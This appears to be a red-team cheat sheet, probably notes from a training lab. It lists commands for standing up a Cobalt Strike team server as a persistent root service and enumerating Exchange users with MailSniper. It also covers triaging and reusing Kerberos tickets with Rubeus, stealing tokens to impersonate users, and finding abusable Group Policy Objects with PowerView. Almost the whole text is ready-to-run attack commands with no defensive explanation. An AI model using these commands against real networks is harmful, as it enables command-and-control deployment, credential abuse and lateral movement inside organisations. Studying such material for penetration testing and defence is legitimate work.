### Starting the TeamServer
```
sudo ./teamserver <host-ip> <password> <c2-profile-path>
```

### Running TeamServer as Systemd service
`/etc/systemd/system/teamserver.service`
```
[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=<cobaltstrike-dir>
ExecStart=<teamserver-path> <host-ip> <password> <c2-profile-path>

[Install]
WantedBy=multi-user.target
```

## Initial Compromise
### MailSniper Password Spraying
#### Importing
`ipmo C:\Tools\MailSniper\MailSniper.ps1`

#### Enumerating NetBIOS name for domain
`Invoke-DomainHarvestOWA -ExchHostname <mailserver-hostname>`

#### Enumerating valid email users
`Invoke-UsernameHarvestOWA -ExchHostname <mailserver-hostname> -Domain <domain> -UserList <possible-names-path> -OutFile <outfile>`


### Kerberos

#### Enumerating TGTs on system
```
execute-assembly <C:\Rubeus\path> triage
```
#### Creating process with TGT
```
execute-assembly <C:\Rubeus\path> createnetonly /program:C:\Windows\System32\cmd.exe /domain:<domain> /username:<user> /password:FakePass /ticket:<tgt>
```

**User can then be impersonated with:**
`beacon> steal_token <pid>`

**Practical command**
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:<tgt>
```

### Group Policy Objects
#### Enumerating GPOs with exploitable properties
**Requires importing Powerview**
```
beacon> powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
```

#### Resolving GPO Display name
```
beacon> powershell Get-DomainGPO -Identity <ObjectDN> | select displayName, gpcFileSysPath
```

#### Resolving Domain Group that GPO applies to
```
beacon> powershell ConvertFrom-SID <SID>
```